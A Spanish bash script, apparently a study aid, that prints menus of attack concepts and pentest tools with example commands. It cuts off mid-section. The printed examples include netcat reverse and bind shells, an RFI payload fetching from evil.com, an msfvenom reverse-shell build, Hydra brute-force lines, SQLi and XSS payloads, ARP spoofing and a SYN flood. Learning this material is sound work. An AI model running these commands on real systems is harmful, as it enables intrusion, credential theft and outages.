#!/bin/bash

# Submenú de Conceptos


menu_ataques() {
    clear
    echo "===== MENÚ DE ATAQUES ====="
    echo "1) Fuerza Bruta"
    echo "2) Diccionario"
    echo "3) SQL Injection"
    echo "4) XSS"
    echo "5) LFI / RFI"
    echo "6) Sniffing"
    echo "7) MITM"
    echo "8) Phishing"
    echo "9) Ingeniería Social"
    echo "10) DoS / DDoS"
    echo "11) Volver al menú principal"
    echo "==========================="
    echo -n "Elige una opción: "
    read opt

    case $opt in
        1) ataque_fuerza_bruta ;;
        2) ataque_diccionario ;;
        3) ataque_sql_injection ;;
        4) ataque_xss ;;
        5) ataque_lfi_rfi ;;
        6) ataque_sniffing ;;
        7) ataque_mitm ;;
        8) ataque_phishing ;;
        9) ataque_ingenieria_social ;;
        10) ataque_dos_ddos ;;
        11) menu2 ;;
        *) echo "Opción inválida"; sleep 1; menu_ataques ;;
    esac
}

ataque_fuerza_bruta() {
    clear
    echo -e "\n🔐 Fuerza Bruta:"
    echo -e "Prueba TODAS las combinaciones posibles de contraseñas contra un servicio o login."
    echo -e "Ejemplo con Hydra:"
    echo "hydra -l admin -P rockyou.txt ssh://192.168.1.10"
    echo -e "Ejemplo Web con POST:"
    echo "hydra -l admin -P pass.txt 192.168.1.10 http-post-form \\"
    echo ""/login.php:user=^USER^&pass=^PASS^:F=Login Failed""
    read -p $'\nPresiona Enter para volver al menú...' _
    menu_ataques
}

ataque_diccionario() {
    clear
    echo -e "\n📖 Ataque de Diccionario:"
    echo -e "Utiliza listas de contraseñas comunes en lugar de combinaciones aleatorias."
    echo "Ejemplo con John:"
    echo "john --wordlist=rockyou.txt hashes.txt"
    echo "Ejemplo con Hashcat:"
    echo "hashcat -a 0 -m 0 hashes.txt rockyou.txt"
    read -p $'\nPresiona Enter para volver...' _
    menu_ataques
}

ataque_sql_injection() {
    clear
    echo -e "\n💉 SQL Injection:"
    echo -e "Inyección de código SQL para acceder o manipular bases de datos."
    echo "Payloads comunes: ' OR '1'='1 --"
    echo "Ejemplo con sqlmap:"
    echo "sqlmap -u "http://victima.com/item.php?id=1" --dbs"
    read -p $'\nPresiona Enter para volver...' _
    menu_ataques
}

ataque_xss() {
    clear
    echo -e "\n🖊️ XSS (Cross-Site Scripting):"
    echo "Permite inyectar JavaScript malicioso en páginas web."
    echo "Ejemplos:"
    echo "<script>alert('XSS')</script>"
    echo "<img src=x onerror=alert(1)>"
    echo "Herramientas: XSStrike, Burp, XSSer"
    read -p $'\nPresiona Enter para volver...' _
    menu_ataques
}

ataque_lfi_rfi() {
    clear
    echo -e "\n📂 LFI / RFI:"
    echo "LFI permite leer archivos locales, RFI carga archivos remotos."
    echo "Ejemplo LFI:"
    echo "http://target.com/index.php?page=../../../../etc/passwd"
    echo "Ejemplo RFI:"
    echo "http://target.com/index.php?page=http://evil.com/shell.txt"
    read -p $'\nPresiona Enter para volver...' _
    menu_ataques
}

ataque_sniffing() {
    clear
    echo -e "\n🔎 Sniffing:"
    echo "Captura de tráfico de red."
    echo "Herramientas: Wireshark, Bettercap, tcpdump"
    read -p $'\nPresiona Enter para volver...' _
    menu_ataques
}

ataque_mitm() {
    clear
    echo -e "\n🕵️ Ataque MITM (Man-In-The-Middle):"
    echo "Intercepta la comunicación entre dos dispositivos."
    echo "Ejemplo con Bettercap:"
    echo "bettercap -iface eth0 -eval \"set arp.spoof.targets 192.168.1.20; arp.spoof on; net.sniff on\""
    read -p $'\nPresiona Enter para volver...' _
    menu_ataques
}

ataque_phishing() {
    clear
    echo -e "\n🎣 Phishing:"
    echo "Engaño mediante páginas falsas o correos maliciosos."
    echo "Herramientas: SET, Evilginx, Gophish"
    read -p $'\nPresiona Enter para volver...' _
    menu_ataques
}

ataque_ingenieria_social() {
    clear
    echo -e "\n🧠 Ingeniería Social:"
    echo "Engaño a humanos para obtener acceso o información."
    echo "Técnicas: Pretexting, Baiting, Vishing, Spear Phishing"
    read -p $'\nPresiona Enter para volver...' _
    menu_ataques
}

ataque_dos_ddos() {
    clear
    echo -e "\n🚫 DoS / DDoS:"
    echo "Ataques para saturar un servidor o red y dejarlo fuera de servicio."
    echo "Herramientas: hping3, LOIC, HOIC, Slowloris"
    echo "Ejemplo:"
    echo "hping3 -S --flood -p 80 192.168.1.1"
    read -p $'\nPresiona Enter para volver...' _
    menu_ataques
}

menu_herramientas() {
    clear
    echo "========= HERRAMIENTAS ========="
    echo "1) Nmap"
    echo "2) Burp Suite"
    echo "3) Hydra"
    echo "4) SQLmap"
    echo "5) Metasploit"
    echo "6) Netcat"
    echo "7) Gobuster"
    echo "8) Whatweb"
    echo "9) Wfuzz"
    echo "10) theHarvester"
    echo "11) Amass"
    echo "12) John the Ripper"
    echo "13) Hashcat"
    echo "14) Responder"
    echo "15) Bettercap"
    echo "16) Wireshark"
    echo "17) ExifTool"
    echo "18) Volver al menú de conceptos"
    echo "================================"
    read -p "Selecciona una herramienta: " herramienta

    case $herramienta in
        1) herramienta_nmap ;;
        2) herramienta_burpsuite ;;
        3) herramienta_hydra ;;
        4) herramienta_sqlmap ;;
        5) herramienta_metasploit ;;
        6) herramienta_netcat ;;
        7) herramienta_gobuster ;;
        8) herramienta_whatweb ;;
        9) herramienta_wfuzz ;;
        10) herramienta_theharvester ;;
        11) herramienta_amass ;;
        12) herramienta_john ;;
        13) herramienta_hashcat ;;
        14) herramienta_responder ;;
        15) herramienta_bettercap ;;
        16) herramienta_wireshark ;;
        17) herramienta_exiftool ;;
        18) menu2 ;;
        *) echo "Opción inválida"; sleep 1; menu_herramientas ;;
    esac
}

herramienta_nmap() {
    clear
    echo -e "\n🔍 Nmap:"
    echo -e "Herramienta de escaneo de redes y puertos. Sirve para:"
    echo -e "- Descubrir puertos abiertos"
    echo -e "- Identificar servicios y versiones"
    echo -e "- Detectar sistemas operativos"
    echo -e "- Ejecutar scripts de vulnerabilidades"
    echo ""

    echo -e "📌 COMANDO BÁSICO:"
    echo -e "nmap target.com\n"

    echo -e "🧪 TÉCNICAS DE ESCANEO:"
    echo -e "- -sS : Escaneo TCP SYN (rápido y sigiloso)"
    echo -e "- -sT : Escaneo TCP completo (menos sigiloso)"
    echo -e "- -sU : Escaneo de puertos UDP"
    echo -e "- -sV : Detecta versiones de servicios"
    echo -e "- -sC : Usa scripts NSE básicos"
    echo -e "- -A  : TODO: SO, scripts, traceroute (más lento)"
    echo -e "- -Pn : No hace ping (si el host bloquea ICMP)"
    echo ""

    echo -e "🎯 PUERTOS:"
    echo -e "- -p 80             : Escanea solo el puerto 80"
    echo -e "- -p 22,80,443      : Escanea múltiples puertos"
    echo -e "- -p-               : Escanea TODOS los 65535 puertos"
    echo ""

    echo -e "🚀 VELOCIDAD Y EVASIÓN:"
    echo -e "- -T4               : Velocidad (1=lento, 5=rápido). 4 es recomendado"
    echo -e "- --max-retries 1   : Intenta menos veces"
    echo -e "- --min-rate 1000   : Fuerza mínimo de paquetes por segundo"
    echo ""

    echo -e "🕵️ DETECCIÓN DE SISTEMAS:"
    echo -e "- -O                : Detecta el sistema operativo"
    echo -e "- --osscan-guess    : Adivina si no lo detecta bien"
    echo -e "- --traceroute      : Muestra ruta de red hasta el objetivo"
    echo ""

    echo -e "🧠 NSE (Nmap Scripting Engine):"
    echo -e "- --script=vuln         : Busca vulnerabilidades comunes"
    echo -e "- --script=http-title   : Muestra títulos de páginas web"
    echo -e "- --script=default       : Usa scripts básicos por defecto"
    echo ""

    echo -e "📂 EJEMPLOS REALES:"
    echo -e "- Escaneo útil y rápido:"
    echo -e "  nmap -sS -sV -T4 -Pn target.com"
    echo -e "- Escaneo completo de todos los puertos:"
    echo -e "  nmap -sS -sV -p- -T4 target.com"
    echo -e "- Escaneo sigiloso con scripts:"
    echo -e "  nmap -sS -sC -T4 -Pn target.com"
    echo -e "- Escaneo agresivo con detección de SO:"
    echo -e "  nmap -A target.com"
    echo ""

    echo -e "🌐 ESCANEAR UNA RED LOCAL:"
    echo -e "- Detectar hosts activos:"
    echo -e "  nmap -sn 192.168.1.0/24"
    echo ""

    echo -e "📥 OPCIONES ÚTILES ADICIONALES:"
    echo -e "- --open           : Muestra solo puertos abiertos"
    echo -e "- -oN reporte.txt  : Guarda el resultado en un archivo"
    echo ""

    read -p "Presiona Enter para volver al menú de herramientas..." _
    menu_herramientas
}
herramienta_burpsuite() {
    clear
    echo -e "\n🕷️ Burp Suite:"
    echo -e "Proxy para interceptar, modificar y analizar tráfico HTTP/S."
    echo -e "Ideal para encontrar XSS, CSRF, LFI, etc."
    echo -e "Usa extensiones como Active Scanner o Repeater para pruebas web manuales."
    echo ""
    read -p "Presiona Enter para volver al menú de herramientas..." _
    menu_herramientas
}

herramienta_hydra() {
    clear
    echo -e "\n💣 Hydra:"
    echo -e "Herramienta de fuerza bruta para romper autenticaciones en servicios de red."
    echo -e "Soporta muchos protocolos: SSH, FTP, HTTP, RDP, SMB, MySQL, Telnet, VNC, etc.\n"

    echo -e "📌 USO BÁSICO:"
    echo -e "hydra -l usuario -P diccionario.txt servicio://objetivo"
    echo -e "Ejemplo:"
    echo -e "hydra -l admin -P rockyou.txt ssh://192.168.1.10\n"

    echo -e "🎯 PARÁMETROS PRINCIPALES:"
    echo -e "- -l        : Usuario único (ej: admin)"
    echo -e "- -L        : Lista de usuarios (uno por línea)"
    echo -e "- -p        : Contraseña única"
    echo -e "- -P        : Lista de contraseñas"
    echo -e "- -t N      : Número de tareas paralelas (por defecto: 16)"
    echo -e "- -vV       : Modo verboso (muestra intentos fallidos)"
    echo -e "- -f        : Para al encontrar la primera combinación válida"
    echo -e "- -s PUERTO : Cambiar puerto si no es el predeterminado"
    echo ""

    echo -e "🧪 EJEMPLOS POR SERVICIO:"
    echo -e "👉 SSH:"
    echo -e "hydra -l root -P rockyou.txt ssh://10.10.10.1"

    echo -e "👉 FTP:"
    echo -e "hydra -L users.txt -P pass.txt ftp://192.168.1.100"

    echo -e "👉 HTTP (formulario):"
    echo -e "hydra -l admin -P pass.txt 192.168.1.100 http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=Credenciales inválidas\""
    echo -e "⚠️ En HTTP necesitas saber cómo se llama el campo del formulario y el texto que sale cuando falla.\n"

    echo -e "🔒 CONSEJOS:"
    echo -e "- Usa diccionarios realistas (ej: rockyou.txt)"
    echo -e "- No uses muchos hilos si la red es lenta: prueba -t 4 o -t 8"
    echo -e "- Revisa primero si el servicio permite múltiples intentos, o bloqueará tu IP"
    echo ""

    echo -e "📁 UBICACIÓN DE DICCIONARIOS POPULARES:"
    echo -e "/usr/share/wordlists/rockyou.txt (en Kali Linux)\n"

    echo -e "💀 USO ÉTICO:"
    echo -e "Hydra debe ser usado solo en entornos autorizados (CTFs, laboratorios, pentests con permiso)."
    echo ""

    read -p "Presiona Enter para volver al menú de herramientas..." _
    menu_herramientas
}

herramienta_sqlmap() {
    clear
    echo -e "\n🧠 SQLmap:"
    echo -e "Herramienta automática para explotar vulnerabilidades de SQL Injection (SQLi)."
    echo -e "Puede obtener bases de datos, tablas, columnas, datos y hasta acceso remoto.\n"

    echo -e "📌 USO BÁSICO:"
    echo -e "sqlmap -u 'http://site.com/page.php?id=1' --dbs"
    echo -e "↪ Detecta la inyección, la explota y muestra las bases de datos disponibles.\n"

    echo -e "🎯 PARÁMETROS CLAVE:"
    echo -e "-u              : URL del parámetro vulnerable"
    echo -e "--dbs           : Lista todas las bases de datos"
    echo -e "--tables        : Lista tablas de una base de datos"
    echo -e "--columns       : Lista columnas de una tabla"
    echo -e "--dump          : Extrae los datos"
    echo -e "-D nombre_db    : Especifica base de datos"
    echo -e "-T nombre_tabla : Especifica tabla"
    echo -e "-C columna1     : Especifica columna\n"

    echo -e "📂 EJEMPLOS COMPLETOS:"
    echo -e "1. Mostrar bases de datos:"
    echo -e "sqlmap -u 'http://site.com/page.php?id=1' --dbs"

    echo -e "2. Mostrar tablas:"
    echo -e "sqlmap -u 'http://site.com/page.php?id=1' -D nombre_db --tables"

    echo -e "3. Mostrar columnas:"
    echo -e "sqlmap -u 'http://site.com/page.php?id=1' -D nombre_db -T tabla --columns"

    echo -e "4. Extraer datos:"
    echo -e "sqlmap -u 'http://site.com/page.php?id=1' -D nombre_db -T tabla --dump\n"

    echo -e "🕵️ OPCIONES AVANZADAS:"
    echo -e "--forms           : Analiza formularios web automáticamente"
    echo -e "--cookie          : Inserta sesión para acceder a sitios con login"
    echo -e "--level=5         : Aumenta profundidad del escaneo"
    echo -e "--risk=3          : Aumenta nivel de riesgo (más agresivo)"
    echo -e "--batch           : Ejecuta sin pedir confirmación (modo automático)"
    echo -e "--random-agent    : Usa user-agents aleatorios para evadir filtros"
    echo ""

    echo -e "⚠️ CONSEJOS:"
    echo -e "- Siempre usar en entornos autorizados (CTF, lab, pentest legal)"
    echo -e "- Evita escanear objetivos reales sin permiso, puede ser delito"
    echo -e "- Usa parámetros como --delay, --tor o --tamper para evadir WAFs"
    echo ""

    echo -e "📦 SQLmap ya viene preinstalado en Kali Linux, pero puedes actualizarlo así:"
    echo -e "git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git\n"

    read -p "Presiona Enter para volver al menú de herramientas..." _
    menu_herramientas
}

herramienta_metasploit() {
    clear
    echo -e "\n🛠️ Metasploit Framework:"
    echo -e "Es uno de los frameworks de explotación más poderosos del mundo."
    echo -e "Permite buscar vulnerabilidades, ejecutar exploits, generar payloads, escalar privilegios y más.\n"

    echo -e "📌 COMANDO PARA ABRIRLO:"
    echo -e "msfconsole\n"

    echo -e "🎯 COMPONENTES PRINCIPALES:"
    echo -e "- exploits   : Código que aprovecha una vulnerabilidad"
    echo -e "- payloads   : Lo que se ejecuta al explotar (ej: reverse shell)"
    echo -e "- auxiliary  : Módulos para escaneo, sniffing, fuzzing, etc"
    echo -e "- encoders   : Codificadores para evadir antivirus"
    echo -e "- post       : Post-explotación (mantener acceso, dump de credenciales...)\n"

    echo -e "🧪 COMANDOS DENTRO DE MSFCONSOLE:"
    echo -e "- search nombre           : Buscar un módulo"
    echo -e "- use módulo              : Seleccionar un módulo (ej: use exploit/windows/smb/ms17_010_eternalblue)"
    echo -e "- show options            : Ver parámetros del módulo"
    echo -e "- set RHOSTS IP           : IP objetivo"
    echo -e "- set LHOST IP            : IP de tu máquina (listener)"
    echo -e "- set PAYLOAD tipo        : Especificar payload (si no lo autoselecciona)"
    echo -e "- exploit                 : Ejecutar ataque"
    echo ""

    echo -e "💣 EJEMPLO REAL:"
    echo -e "Explotar una máquina vulnerable a MS17-010 (EternalBlue):"
    echo -e "1. msfconsole"
    echo -e "2. search eternalblue"
    echo -e "3. use exploit/windows/smb/ms17_010_eternalblue"
    echo -e "4. set RHOSTS 10.10.10.4"
    echo -e "5. set LHOST 10.10.14.2"
    echo -e "6. exploit\n"

    echo -e "📦 CREAR UN PAYLOAD PERSONALIZADO:"
    echo -e "msfvenom -p windows/meterpreter/reverse_tcp LHOST=TUIP LPORT=4444 -f exe > shell.exe\n"

    echo -e "🔌 ESCUCHAR LA CONEXIÓN REVERSA:"
    echo -e "use exploit/multi/handler"
    echo -e "set PAYLOAD windows/meterpreter/reverse_tcp"
    echo -e "set LHOST TUIP"
    echo -e "set LPORT 4444"
    echo -e "run\n"

    echo -e "🧠 CONSEJOS:"
    echo -e "- Usa 'searchsploit' o 'nmap --script vuln' para encontrar vulnerabilidades y luego busca el exploit en Metasploit"
    echo -e "- Puedes automatizar ataques combinando con scripts y bash"
    echo -e "- Usa en laboratorios como HackTheBox o TryHackMe para aprender sin romper la ley\n"

    echo -e "💀 RECUERDA: El uso de Metasploit sin autorización es ilegal. Úsalo solo en entornos controlados o con permiso.\n"

    read -p "Presiona Enter para volver al menú de herramientas..." _
    menu_herramientas
}


herramienta_netcat() {
    clear
    echo -e "\n📡 Netcat (nc):"
    echo -e "Herramienta de red versátil conocida como la 'navaja suiza del hacking'."
    echo -e "Permite escanear puertos, transferir archivos, escuchar conexiones y crear shells remotos.\n"

    echo -e "🔌 MODO ESCUCHA (Servidor):"
    echo -e "nc -lvnp 4444"
    echo -e "-l : Modo escucha"
    echo -e "-v : Verboso (muestra info)"
    echo -e "-n : No resuelve DNS"
    echo -e "-p : Puerto a usar\n"

    echo -e "📤 MODO CLIENTE (Conectarse a otro host):"
    echo -e "nc IP PUERTO"
    echo -e "Ejemplo:"
    echo -e "nc 192.168.1.10 4444\n"

    echo -e "💀 SHELL REVERSA (Linux):"
    echo -e "1. Atacante escucha:"
    echo -e "   nc -lvnp 4444"
    echo -e "2. Víctima ejecuta:"
    echo -e "   nc 10.10.14.2 4444 -e /bin/bash"
    echo -e "⚠️ -e ejecuta una shell y la redirige por el canal TCP\n"

    echo -e "💀 SHELL REVERSA (Windows):"
    echo -e "nc.exe 10.10.14.2 4444 -e cmd.exe\n"

    echo -e "🔁 SHELL BIND:"
    echo -e "1. Víctima escucha:"
    echo -e "   nc -lvnp 4444 -e /bin/bash"
    echo -e "2. Atacante se conecta:"
    echo -e "   nc IPvictima 4444\n"

    echo -e "📁 TRANSFERENCIA DE ARCHIVOS:"
    echo -e "1. En receptor:"
    echo -e "   nc -lvnp 4444 > archivo.txt"
    echo -e "2. En emisor:"
    echo -e "   nc IPdestino 4444 < archivo.txt\n"

    echo -e "🕵️ ESCANEO DE PUERTOS:"
    echo -e "nc -zv 192.168.1.1 20-100"
    echo -e "-z : Scan sin enviar datos"
    echo -e "-v : Verbose\n"

    echo -e "🔐 CONSEJOS:"
    echo -e "- No todos los Netcat tienen la opción -e (por ejemplo, el de Debian/Kali sí; el de Ubuntu puede que no)"
    echo -e "- Usa socat si necesitas cifrado o funcionalidades más avanzadas"
    echo -e "- Ideal para CTFs, shells rápidas y transferencia en entornos restringidos\n"

    echo -e "🚨 USO LEGAL:"
    echo -e "Netcat es poderosa pero debe usarse con permiso. No la uses para conectarte a sistemas ajenos sin autorización.\n"

    read -p "Presiona Enter para volver al menú de herramientas..." _
    menu_herramientas
}


herramienta_gobuster() {
    clear
    echo -e "\n📂 Gobuster:"
    echo -e "Herramienta rápida de fuerza bruta escrita en Go, ideal para descubrir:"
    echo -e "- Directorios ocultos"
    echo -e "- Archivos"
    echo -e "- Subdominios"
    echo -e "- Buckets de Amazon S3\n"

    echo -e "🧰 MODO 1: Enumerar directorios (modo dir)"
    echo -e "Ejemplo básico:"
    echo -e "gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt"

    echo -e "\n🧪 PARÁMETROS CLAVE:"
    echo -e "-u     : URL objetivo"
    echo -e "-w     : Wordlist de directorios o archivos"
    echo -e "-x     : Extensiones a probar (.php,.txt,.html)"
    echo -e "-t     : Número de hilos (default: 10)"
    echo -e "-s     : Códigos de estado HTTP válidos (ej: 200,204)"
    echo -e "-k     : Ignorar certificados SSL"
    echo -e "-o     : Guardar salida a archivo"
    echo ""

    echo -e "🔍 EJEMPLO AVANZADO:"
    echo -e "gobuster dir -u https://target.com -w wordlist.txt -x php,txt -t 20 -s 200,204 -k -o resultado.txt\n"

    echo -e "🌐 MODO 2: Enumerar subdominios (modo dns)"
    echo -e "gobuster dns -d target.com -w subdominios.txt -t 30"

    echo -e "🔎 MODO 3: Enumerar buckets S3"
    echo -e "gobuster s3 -w bucketlist.txt\n"

    echo -e "📁 DICCIONARIOS RECOMENDADOS:"
    echo -e "- /usr/share/wordlists/dirb/common.txt"
    echo -e "- /usr/share/seclists/Discovery/Web-Content/*.txt"
    echo ""

    echo -e "💡 CONSEJOS:"
    echo -e "- Filtra respuestas 403, 301 o 404 si no son útiles en ese servidor"
    echo -e "- Usa extensiones como .php, .asp, .bak para buscar archivos jugosos"
    echo -e "- Para APIs REST, prueba extensiones como .json, .env, etc"
    echo ""

    echo -e "⚠️ ADVERTENCIA:"
    echo -e "Nunca hagas fuerza bruta sin autorización. Úsalo solo en entornos legales o de laboratorio.\n"

    read -p "Presiona Enter para volver al menú de herramientas..." _
    menu_herramientas
}

herramienta_whatweb() {
    clear
    echo -e "\n🌐 WhatWeb:"
    echo -e "Herramienta de fingerprinting web que identifica tecnologías utilizadas en un sitio web."
    echo -e "Puede detectar: CMS (WordPress, Joomla), frameworks, servidores, cookies, lenguajes, IDs de Google Analytics, etc.\n"

    echo -e "📌 USO BÁSICO:"
    echo -e "whatweb http://target.com\n"

    echo -e "🧪 PARÁMETROS ÚTILES:"
    echo -e "-v                : Modo verboso (muestra más información)"
    echo -e "-a N              : Nivel de agresividad (0 a 3). Por defecto: 1"
    echo -e "-U 'User-Agent'   : Cambiar User-Agent (útil para evadir detección)"
    echo -e "--no-errors       : Oculta errores en la salida"
    echo -e "--color=never     : Desactiva colores (útil para guardar en archivo)"
    echo -e "-oA salida        : Guarda resultado en varios formatos (html, json, txt)\n"

    echo -e "🔍 EJEMPLOS:"
    echo -e "1. Escaneo básico:"
    echo -e "   whatweb http://victima.com"

    echo -e "2. Escaneo con más detalles:"
    echo -e "   whatweb -v -a 3 http://victima.com"

    echo -e "3. Guardar salida:"
    echo -e "   whatweb -v -a 3 --color=never -oA resultado http://victima.com"

    echo -e "4. Cambiar User-Agent:"
    echo -e "   whatweb -U 'Mozilla/5.0' http://victima.com\n"

    echo -e "📁 UBICACIÓN:"
    echo -e "WhatWeb está instalado por defecto en Kali Linux, pero si no lo tienes:"
    echo -e "sudo apt install whatweb\n"

    echo -e "💡 CONSEJOS:"
    echo -e "- Úsalo antes de lanzar escaneos más agresivos como Nikto o Dirb"
    echo -e "- Revisa headers y cookies que revela para detectar tecnologías ocultas"
    echo -e "- Complementa con herramientas como Wappalyzer o Netcraft\n"

    echo -e "⚠️ USO ÉTICO:"
    echo -e "WhatWeb es pasivo en su modo básico, pero con niveles altos puede ser detectado."
    echo -e "No escanees sin autorización legal. Úsalo solo en entornos controlados o educativos.\n"

    read -p "Presiona Enter para volver al menú de herramientas..." _
    menu_herramientas
}

herramienta_wfuzz() {
    clear
    echo -e "\n🐍 Wfuzz:"
    echo -e "Herramienta de fuzzing web para detectar rutas, parámetros, subdominios, archivos ocultos, vulnerabilidades, etc."
    echo -e "Ideal para enumeración en aplicaciones web.\n"

    echo -e "📌 USO BÁSICO:"
    echo -e "wfuzz -u http://target.com/FUZZ -w wordlist.txt"
    echo -e "↪ Fuerza rutas en el sitio reemplazando la palabra FUZZ con cada entrada de la wordlist.\n"

    echo -e "🧪 PARÁMETROS CLAVE:"
    echo -e "-u URL           : URL objetivo (usa FUZZ donde va a reemplazar)"
    echo -e "-w diccionario   : Diccionario a usar (una palabra por línea)"
    echo -e "-c               : Salida con colores"
    echo -e "-t N             : Número de hilos (threads)"
    echo -e "--hc             : Códigos de estado HTTP a ocultar (ej: 404)"
    echo -e "--hh             : Oculta respuestas con un tamaño específico (en bytes)"
    echo ""

    echo -e "🔍 EJEMPLOS:"
    echo -e "1. Fuerza directorios:"
    echo -e "   wfuzz -u http://victima.com/FUZZ -w /usr/share/wordlists/dirb/common.txt"

    echo -e "2. Fuerza parámetros GET:"
    echo -e "   wfuzz -u 'http://victima.com/index.php?FUZZ=valor' -w parametros.txt"

    echo -e "3. Buscar archivos .php:"
    echo -e "   wfuzz -u http://victima.com/FUZZ -w lista.txt -X GET -e .php"

    echo -e "4. Enumerar subdominios:"
    echo -e "   wfuzz -H 'Host: FUZZ.victima.com' -u http://victima.com -w subdominios.txt\n"

    echo -e "📂 DICCIONARIOS RECOMENDADOS:"
    echo -e "- /usr/share/wordlists/dirb/common.txt"
    echo -e "- /usr/share/seclists/Discovery/Web-Content/"
    echo -e "- /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n"

    echo -e "🎯 FILTRAR RESPUESTAS:"
    echo -e "--hc 404           : Oculta respuestas 404 (no encontrado)"
    echo -e "--hh 0             : Oculta respuestas vacías"
    echo -e "--hs 'Palabra'     : Oculta si contiene esa palabra"
    echo ""

    echo -e "⚠️ CONSEJOS:"
    echo -e "- Siempre usa FUZZ en la URL o encabezados donde quieres atacar"
    echo -e "- Usa diccionarios específicos según lo que estás buscando (subdominios, rutas, archivos)"
    echo -e "- Compara tamaño/respuesta de páginas válidas y falsas para entender mejor los resultados"
    echo ""

    echo -e "🔐 USO LEGAL:"
    echo -e "Wfuzz es potente, pero no lo uses fuera de entornos legales o controlados."
    echo -e "Ideal para CTFs, laboratorios como TryHackMe o Bug Bounty autorizados.\n"

    read -p "Presiona Enter para volver al menú de herramientas..." _
    menu_herramientas
}

herramienta_theharvester() {
    clear
    echo -e "\n🕵️ theHarvester:"
    echo -e "Herramienta OSINT para recolectar información de correos, hosts, y subdominios desde diversas fuentes públicas.\n"
    echo -e "📌 USO:"
    echo -e "theHarvester -d dominio.com -b google -l 500 -f resultado.html\n"
    echo -e "🧪 PARÁMETROS:"
    echo -e "-d    : Dominio objetivo"
    echo -e "-b    : Fuente de búsqueda (google, bing, linkedin, etc.)"
    echo -e "-l    : Límite de resultados"
    echo -e "-f    : Archivo de salida en HTML"
    echo -e "-s    : Saltar primeros resultados"
    echo -e "-v    : Modo verboso"
    echo -e "-h    : Mostrar ayuda\n"
    echo -e "🔍 EJEMPLO:"
    echo -e "theHarvester -d ejemplo.com -b bing -l 200 -s 0 -f informe.html -v\n"
    read -p "Presiona Enter para volver..." _
    menu_herramientas
}

herramienta_amass() {
    clear
    echo -e "\n🌐 Amass:"
    echo -e "Herramienta para la enumeración de subdominios, mapeo de redes y reconocimiento externo.\n"
    echo -e "📌 USO:"
    echo -e "amass enum -passive -d dominio.com -o salida.txt\n"
    echo -e "🧪 PARÁMETROS:"
    echo -e "enum       : Modo de enumeración"
    echo -e "-d         : Dominio objetivo"
    echo -e "-o         : Guardar resultados en archivo"
    echo -e "-passive   : Solo técnicas pasivas"
    echo -e "-active    : Técnicas activas (requiere configuración)"
    echo -e "-brute     : Fuerza nombres de subdominio"
    echo -e "-config    : Usar archivo de configuración YAML\n"
    echo -e "🔍 EJEMPLO:"
    echo -e "amass enum -brute -d ejemplo.com -o subdominios.txt\n"
    read -p "Presiona Enter para volver..." _
    menu_herramientas
}

herramienta_john() {
    clear
    echo -e "\n🔓 John the Ripper:"
    echo -e "Herramienta para descifrado de contraseñas mediante ataque de diccionario o fuerza bruta.\n"
    echo -e "📌 USO:"
    echo -e "john --wordlist=rockyou.txt hash.txt\n"
    echo -e "🧪 PARÁMETROS:"
    echo -e "--wordlist=archivo : Usa diccionario específico"
    echo -e "--format=tipo      : Especifica formato del hash (raw-md5, sha256, bcrypt, etc.)"
    echo -e "--show             : Muestra contraseñas crackeadas"
    echo -e "--incremental      : Usa fuerza bruta\n"
    echo -e "🔍 EJEMPLOS:"
    echo -e "john --format=raw-md5 hash.txt"
    echo -e "john --show hash.txt\n"
    read -p "Presiona Enter para volver..." _
    menu_herramientas
}

herramienta_hashcat() {
    clear
    echo -e "\n⚡ Hashcat:"
    echo -e "Crack de hashes usando GPU, muy potente. Compatible con múltiples tipos de hash y modos de ataque.\n"
    echo -e "📌 USO:"
    echo -e "hashcat -m 0 -a 0 hash.txt rockyou.txt\n"
    echo -e "🧪 PARÁMETROS:"
    echo -e "-m   : Tipo de hash (0=MD5, 1000=NTLM, 1800=SHA512crypt)"
    echo -e "-a   : Modo de ataque (0=diccionario, 1=combinación, 3=mask)"
    echo -e "--force : Fuerza ejecución aunque haya advertencias"
    echo -e "-O   : Optimiza velocidad (puede perder precisión)"
    echo -e "--show : Muestra resultados crackeados\n"
    echo -e "🔍 EJEMPLO:"
    echo -e "hashcat -m 1000 -a 0 hashes.txt diccionario.txt --force --show\n"
    read -p "Presiona Enter para volver..." _
    menu_herramientas
}

herramienta_responder() {
    clear
    echo -e "\n🎯 Responder:"
    echo -e "Captura hashes en redes Windows mediante envenenamiento de LLMNR, NBT-NS y WPAD.\n"
    echo -e "📌 USO:"
    echo -e "sudo responder -I eth0 -v\n"
    echo -e "🧪 PARÁMETROS:"
    echo -e "-I     : Interfaz de red"
    echo -e "-v     : Modo verboso"
    echo -e "-rd    : Responde a peticiones DHCP"
    echo -e "-wrf   : WPAD Rogue Proxy Server"
    echo -e "-f     : Forzar respuestas"
    echo -e "-b     : Análisis de nombres NetBIOS\n"
    echo -e "🔍 EJEMPLO:"
    echo -e "sudo responder -I wlan0 -wrf -v\n"
    read -p "Presiona Enter para volver..." _
    menu_herramientas
}

herramienta_bettercap() {
    clear
    echo -e "\n🔥 Bettercap:"
    echo -e "MITM, sniffer, spoofing y manipulación de tráfico de red en tiempo real. Muy potente.\n"
    echo -e "📌 USO:"
    echo -e "sudo bettercap -iface wlan0\n"
    echo -e "🧪 COMANDOS INTERACTIVOS:"
    echo -e "net.probe on       : Detecta dispositivos"
    echo -e "net.recon on       : Reconocimiento ARP"
    echo -e "net.sniff on       : Captura tráfico"
    echo -e "http.proxy on      : Intercepta tráfico HTTP"
    echo -e "set arp.spoof.targets 192.168.1.10"
    echo -e "arp.spoof on\n"
    read -p "Presiona Enter para volver..." _
    menu_herramientas
}

herramienta_wireshark() {
    clear
    echo -e "\n📶 Wireshark:"
    echo -e "Análisis gráfico de paquetes de red. Muy usado para diagnóstico y sniffing.\n"
    echo -e "📌 FILTROS:"
    echo -e "http                : Solo tráfico HTTP"
    echo -e "ip.addr == 10.0.2.15"
    echo -e "tcp.port == 80"
    echo -e "dns"
    echo -e "tcp contains \"password\"\n"
    echo -e "📘 Ejecútalo con:"
    echo -e "sudo wireshark\n"
    read -p "Presiona Enter para volver..." _
    menu_herramientas
}

herramienta_exiftool() {
    clear
    echo -e "\n📸 ExifTool:"
    echo -e "Lee, escribe y elimina metadatos en imágenes, documentos, PDFs, audio, etc.\n"
    echo -e "📌 COMANDOS:"
    echo -e "exiftool imagen.jpg            : Ver metadatos"
    echo -e "exiftool -all= imagen.jpg      : Borrar metadatos"
